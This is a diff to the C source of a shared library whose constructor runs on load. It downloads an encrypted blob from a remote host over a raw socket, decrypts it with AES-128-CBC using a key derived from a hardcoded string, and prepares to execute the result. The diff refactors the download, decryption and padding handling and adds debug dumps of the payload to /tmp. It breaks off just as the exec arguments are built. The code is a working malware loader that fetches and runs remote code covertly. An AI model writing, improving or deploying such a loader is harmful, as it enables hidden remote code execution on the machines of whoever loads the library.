@@ -24,18 +24,26 @@
 #endif
 
 /**
- * Decrypts data using the AES-128-CBC algorithm.
+ * Decrypts data using the AES-128-CBC algorithm and removes padding.
  *
  * @param data The data to decrypt.
  * @param data_size The size of the data.
  * @param key The decryption key.
  * @param iv The initialization vector.
+ * @return The size of the decrypted data without padding.
  */
-void decrypt_data(char *data, size_t data_size, const uint8_t *key,
-                  const uint8_t *iv) {
+size_t decrypt_data(char *data, size_t data_size, const uint8_t *key,
+                    const uint8_t *iv) {
   struct AES_ctx ctx;
   AES_init_ctx_iv(&ctx, key, iv);
   AES_CBC_decrypt_buffer(&ctx, (uint8_t *)data, data_size);
+
+  // Remove padding
+  uint8_t padding = data[data_size - 1];
+  if (padding > AES_BLOCKLEN) {
+    return data_size; // Invalid padding
+  }
+  return data_size - padding;
 }
 
 /**
@@ -65,15 +73,15 @@ void derive_key_from_string(const char *str, uint8_t *key) {
  * @param port The port to connect to.
  * @param path The path of the file on the server.
  * @param key The decryption key.
- * @return The decrypted data.
+ * @param buffer The buffer to write the downloaded data to.
+ * @return The size of the downloaded data.
  */
-char *download_file(const char *host, const char *port, const char *path,
-                    const uint8_t *key) {
+size_t download_file(const char *host, const char *port, const char *path,
+                     const uint8_t *key, char **buffer) {
   int sockfd;
   struct addrinfo hints, *res;
   char request[BUFFER_SIZE];
-  char buffer[BUFFER_SIZE];
-  char *data = NULL;
+  char temp_buffer[BUFFER_SIZE];
   size_t data_size = 0;
 
   // Prepare the address info
@@ -83,7 +91,7 @@ char *download_file(const char *host, const char *port, const char *path,
 
   if (getaddrinfo(host, port, &hints, &res) != 0) {
     perror("getaddrinfo");
-    return NULL;
+    return 0;
   }
 
   // Create the socket
@@ -91,7 +99,7 @@ char *download_file(const char *host, const char *port, const char *path,
   if (sockfd == -1) {
     perror("socket");
     freeaddrinfo(res);
-    return NULL;
+    return 0;
   }
 
   // Connect to the server
@@ -99,7 +107,7 @@ char *download_file(const char *host, const char *port, const char *path,
     perror("connect");
     close(sockfd);
     freeaddrinfo(res);
-    return NULL;
+    return 0;
   }
 
   freeaddrinfo(res);
@@ -113,31 +121,31 @@ char *download_file(const char *host, const char *port, const char *path,
   if (send(sockfd, request, strlen(request), 0) == -1) {
     perror("send");
     close(sockfd);
-    return NULL;
+    return 0;
   }
 
   // Read the response and store in memory
   int header_end = 0;
   while (1) {
-    ssize_t bytes_received = recv(sockfd, buffer, sizeof(buffer), 0);
+    ssize_t bytes_received = recv(sockfd, temp_buffer, sizeof(temp_buffer), 0);
     if (bytes_received <= 0) {
       break;
     }
 
     // Skip HTTP headers
     if (!header_end) {
-      char *header_end_ptr = strstr(buffer, "\r\n\r\n");
+      char *header_end_ptr = strstr(temp_buffer, "\r\n\r\n");
       if (header_end_ptr) {
         header_end = 1;
-        size_t header_length = header_end_ptr - buffer + 4;
-        data = realloc(data, data_size + bytes_received - header_length);
-        memcpy(data + data_size, buffer + header_length,
+        size_t header_length = header_end_ptr - temp_buffer + 4;
+        *buffer = realloc(*buffer, data_size + bytes_received - header_length);
+        memcpy(*buffer + data_size, temp_buffer + header_length,
                bytes_received - header_length);
         data_size += bytes_received - header_length;
       }
     } else {
-      data = realloc(data, data_size + bytes_received);
-      memcpy(data + data_size, buffer, bytes_received);
+      *buffer = realloc(*buffer, data_size + bytes_received);
+      memcpy(*buffer + data_size, temp_buffer, bytes_received);
       data_size += bytes_received;
     }
   }
@@ -150,7 +158,7 @@ char *download_file(const char *host, const char *port, const char *path,
   // Save the original downloaded data to disk
   FILE *file = fopen("/tmp/downloaded_data", "wb");
   if (file) {
-    fwrite(data, 1, data_size, file);
+    fwrite(*buffer, 1, data_size, file);
     fclose(file);
     DEBUG_PRINT("Downloaded data saved to /tmp/downloaded_data\n");
   } else {
@@ -158,19 +166,7 @@ char *download_file(const char *host, const char *port, const char *path,
   }
 #endif
 
-#ifdef DEBUG
-  // Save the decrypted data to disk
-  file = fopen("/tmp/decrypted_data", "wb");
-  if (file) {
-    fwrite(data + 16, 1, data_size - 16, file);
-    fclose(file);
-    DEBUG_PRINT("Decrypted data saved to /tmp/decrypted_data\n");
-  } else {
-    perror("fopen");
-  }
-#endif
-
-  return data;
+  return data_size;
 }
 
 /**
@@ -232,18 +228,35 @@ void __attribute__((constructor)) initLibrary(void) {
   const char *key_str = "my_secret_key";
   uint8_t key[16];
   derive_key_from_string(key_str, key);
-  char *buf = download_file(host, port, path, key);
-  if (!buf) {
+  char *buf = NULL;
+  size_t data_size = download_file(host, port, path, key, &buf);
+  if (data_size == 0) {
     return;
   }
 
   // Extract IV from the beginning of the buffer
   uint8_t iv[16];
   memcpy(iv, buf, 16);
+  DEBUG_PRINT("IV: %02x%02x%02x%02x%02x%02x%02x%02x"
+              "%02x%02x%02x%02x%02x%02x%02x%02x\n",
+              iv[0], iv[1], iv[2], iv[3], iv[4], iv[5], iv[6], iv[7], iv[8],
+              iv[9], iv[10], iv[11], iv[12], iv[13], iv[14], iv[15]);
 
   // Decrypt the downloaded data
-  size_t data_size = strlen(buf + 16); // Get the data size
-  decrypt_data(buf + 16, data_size, key, iv);
+  DEBUG_PRINT("Encrypted data size: %zu\n", data_size - 16);
+  size_t decrypted_size = decrypt_data(buf + 16, data_size - 16, key, iv);
+
+#ifdef DEBUG
+  // Save the decrypted data to disk
+  FILE *file = fopen("/tmp/decrypted_data", "wb");
+  if (file) {
+    fwrite(buf + 16, 1, decrypted_size, file);
+    fclose(file);
+    DEBUG_PRINT("Decrypted data saved to /tmp/decrypted_data\n");
+  } else {
+    perror("fopen");
+  }
+#endif
 
   char *argv[] = {"", NULL};
   char *envv[] = {"PATH=/bin:/usr/bin:/sbin:/usr/sbin",
